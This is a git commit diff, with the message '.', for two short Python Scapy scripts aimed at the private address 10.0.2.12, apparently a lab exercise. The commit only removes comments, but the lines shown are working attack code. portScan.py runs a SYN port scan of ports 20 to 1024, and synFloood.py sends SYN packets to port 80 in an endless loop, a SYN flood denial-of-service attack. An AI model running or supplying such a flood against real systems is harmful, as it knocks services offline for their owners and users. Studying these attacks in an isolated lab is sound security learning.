718406ffe3e7e07af30758d312e49ba6e82d4817
yildiz-busra <busrayildiz952@gmail.com>
2024-12-22 14:52:55 -0500

    .

--- portScan.py
+++ portScan.py
@@ -1,7 +1,7 @@
 from scapy.all import sr1, IP, TCP
 
 target_ip = "10.0.2.12"
-for port in range(20, 1025):  # Scanning ports 20 to 1024
+for port in range(20, 1025): 
     packet = IP(dst=target_ip)/TCP(dport=port, flags='S')
     response = sr1(packet, timeout=0.5, verbose=False)
     if response and response.haslayer(TCP) and response.getlayer(TCP).flags == 0x12:
--- synFloood.py
+++ synFloood.py
@@ -1,7 +1,7 @@
 from scapy.all import send, IP, TCP
 
 target_ip = "10.0.2.12"
-target_port = 80  # Common port
+target_port = 80 
 packet = IP(dst=target_ip)/TCP(dport=target_port, flags='S')
 
-send(packet, loop=1, verbose=False)  # Loop for continuous flooding
+send(packet, loop=1, verbose=False) 
